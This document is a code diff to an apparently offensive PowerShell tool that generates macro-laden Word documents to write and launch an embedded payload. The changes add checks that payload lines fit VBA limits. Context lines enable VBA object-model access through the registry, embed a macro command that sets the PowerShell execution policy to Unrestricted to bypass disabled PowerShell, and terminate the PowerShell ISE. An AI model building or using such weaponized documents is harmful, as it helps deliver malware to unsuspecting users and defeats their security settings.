@@ -89,16 +89,17 @@ yMMMMd.yyys/-----/+---/:--sNMMMMMNs/---/+-----:oyyy+MMMMMh
 "@
 
 # Helpers for setting the reg key enabling interaction with Word
+
+# Test if the registry value under key\name exists and equals to the designated value
 Function Test-RegistryValue($regkey, $name, $value) {
-    # Test if the registry value under key\name exists and equals to the designated value
     Try {
         Return ((Get-ItemProperty -Path $regkey -Name $name  -ErrorAction SilentlyContinue).$name -eq $value)
     }
     Catch {Return $false}
 }
 
+# Test if the registry value under key exists
 Function Test-RegistryKey($regkey) {
-    # Test if the registry value under key exists
     Try {
         Get-ItemProperty -Path $regkey -ErrorAction SilentlyContinue
         Return $true
@@ -106,12 +107,14 @@ Function Test-RegistryKey($regkey) {
     Catch {Return $false}
 }
 
+# Checks if the mandatory registry value is set correctly
 Function IsVbomSet() {
     If (Test-RegistryValue $path "AccessVBOM" 0x1) {return $true}
     Else {Return $false}
 }
 
-function SetVBOMRegVal() {
+# Verify and set if required the mandatory VBOM registry value 
+function VerifyVbomKey() {
     # Verify that the mandatory VBOM reg key is set
     $officeVer = (New-Object -ComObject word.application).version
     $path = "HKCU:\Software\Microsoft\Office\" + $officeVer.ToString() + "\Word\Security"
@@ -127,7 +130,7 @@ function SetVBOMRegVal() {
                 Return $true
             }
             Else {
-                Write-Output "Something went wrong while setting the VBOM registry value, terminating..."
+                Write-Error "Something went wrong while setting the VBOM registry value, terminating..."
                 Exit
             }
         }
@@ -136,10 +139,48 @@ function SetVBOMRegVal() {
         }
     }
     Else {
-        Write-Output "Something went wrong while testing the existance of VBOM registry key, terminating..."
+        Write-Error "Something went wrong while testing the existance of VBOM registry key, terminating..."
         Exit
     }
 
+}
+
+# Verify that the line doesn't exceed the maximal allowed lenght of a VBA line
+function VerifyLineLen($line) {
+    if ($line.length -gt 1024){
+        Write-Error @"
+        One of the payload's lines is too long, VBA tolerates only lines shorter than 1024 chars.
+        Faluting line is:
+        $($line)
+"@
+    Exit
+    }
+}
+
+# Helpers for verifying payload won't break VBA
+
+# Verify that no unsupported chars are in the payload
+Function VerifyOnlyAscii($line) {
+    # Check if when casted to UTF8 and ASCII string lenght is different
+    $ascii = [System.Text.Encoding]::ASCII
+    $utf8 = [System.Text.Encoding]::UTF8
+    if ($ascii.GetBytes($line).length -eq $utf8.GetBytes($line).length){
+        return
+    }
+    else{
+        Write-Error @"
+        One of the payload's lines contains non-ASCII char, VBA doesn't support this - consider encoding it in a differnet way.
+        Faluting line is:
+        $($line)
+"@
+        Exit
+    }
+}
+
+# Wrapper for all payload-VBA compatibility tests
+Function VerifyVbaLine($line){
+    VerifyOnlyAscii($line)
+    VerifyLineLen ($line)
 }
 
 # A class which represents a single WinWord-macro-infused document
@@ -155,14 +196,14 @@ Class MacroDoc {
     # Static strings which are optional parts of the macro
     $hkcuBypassRegKey = @"
 
-'allow execution even where PS is disabled
-stream.WriteLine "reg add ""HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"" /v ""ExecutionPolicy"" /t REG_SZ /d ""Unrestricted"" /f"
+    'allow execution even where PS is disabled
+    stream.WriteLine "reg add ""HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"" /v ""ExecutionPolicy"" /t REG_SZ /d ""Unrestricted"" /f"
 
 "@
     $iseSelfTerminateString = @"
     'finally, terminate the parent PowerShell ISE
-stream.WriteLine "Start-Sleep -s 1"
-stream.WriteLine "Stop-Process -processname PowerShell_ISE"
+    stream.WriteLine "Start-Sleep -s 1"
+    stream.WriteLine "Stop-Process -processname PowerShell_ISE"
 "@
 
     $batchLauncer = @"
@@ -452,7 +493,7 @@ $($writeBatFunc)
 Write-Host $NoShellBanner
 
 # Verify mandatory registry key is set
-If ( -Not (SetVBOMRegVal) ) {
+If ( -Not (VerifyVbomKey) ) {
     Write-Error "Can't set VBOM registry value, terminating..."
     Exit
 }
@@ -471,7 +512,9 @@ stream.WriteLine "" `r`n
 
         ForEach ($line in $($payload -split "`r`n")) {
             $line = $line.Replace("""", """""")
-            $payloadInLines = $payloadInLines + "stream.WriteLine """ + $line + """`r`n"
+            $lineToWrite = "stream.WriteLine """ + $line + """`r`n"
+            VerifyVbaLine $lineToWrite
+            $payloadInLines = $payloadInLines + $lineToWrite
         }
         $global:payloadInLines = $payloadInLines
         # If we are here - there were no errors and we can break the loop
